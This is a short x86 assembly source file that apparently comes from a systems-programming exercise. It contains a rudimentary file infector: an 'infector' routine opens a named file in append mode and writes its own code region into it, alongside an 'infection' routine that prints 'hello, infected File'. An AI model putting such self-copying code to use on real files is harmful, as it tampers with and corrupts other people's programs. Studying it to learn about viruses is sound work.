section .text
    msg db 'hello, infected File',10
    len equ $ - msg

global _start
global system_call
global code_start
global code_end
global infection
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov edx,len             ;message length
    mov ecx,msg             ;message to write
    mov ebx,1               ;file descriptor (stdout)
    mov eax,4               ;system call number (sys_write)
    int 0x80                ;call kernel

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state
    
    ;open file
    mov eax, 5              ; sys_open
    mov ebx,[ebp+8]         ; name
    mov ecx, 1026           ; 1024(append)+2(read&write)
    mov edx, 0777           ; permission   
    int 0x80                ; Transfer control to operating system

    ;write to file
    mov ebx, eax                        ; name
    mov eax, 4                          ; sys_write
    mov ecx, code_start                 ; Code to inject the file 
    mov edx, code_end - code_start      ; Input length
    int 0x80                            ; Transfer control to operating system
    
    ;close file
    mov     eax, 6                          ; sys_close      
    int     0x80                            ; Transfer control to operating system

    mov     [ebp-4], eax                    ; Save returned value...
    popad                                   ; Restore caller state (registers)
    mov     eax, [ebp-4]                    ; place returned value where caller can see it
    add     esp, 4                          ; Restore caller state
    pop     ebp                             ; Restore caller state
    ret                                     ; Back to caller 
 
code_end:
